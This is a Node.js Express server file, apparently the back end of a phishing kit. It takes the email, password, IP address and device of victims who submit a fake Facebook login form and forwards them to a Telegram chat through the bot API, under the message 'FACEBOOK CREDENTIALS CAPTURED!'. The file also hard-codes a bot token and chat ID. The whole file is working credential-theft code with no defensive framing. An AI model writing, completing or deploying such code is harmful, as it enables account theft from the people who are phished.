// ✅ FIXED server.js
const express = require('express');
const app = express();
const cors = require('cors');
const axios = require('axios');

// 🔴 Telegram credentials
const BOT_TOKEN = '8435072756:AAE3WSR_8GtGVsMHsQIlrTnncW3WVVnqjKc';
const CHAT_ID = '8977141602';  // ⬅️ CHANGE THIS! Get from @userinfobot

app.use(cors());
app.use(express.json());
app.use(express.static('.'));

app.post('/send', async (req, res) => {
    try {
        const { email, password, userAgent } = req.body;
        const realIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        
        const message = `
🔴 FACEBOOK CREDENTIALS CAPTURED! 🔴

📧 Email: ${email}
🔑 Password: ${password}
🌐 IP: ${realIP}
📱 Device: ${userAgent}
🕐 Time: ${new Date().toLocaleString()}
        `;
        
        const response = await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
                chat_id: CHAT_ID,  // ⬅️ This must be YOUR user ID
                text: message
            }
        );
        
        console.log(`✅ Credentials sent: ${email}`);
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Error:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.listen(3000, () => {
    console.log('🔴 Server running on port 3000');
});
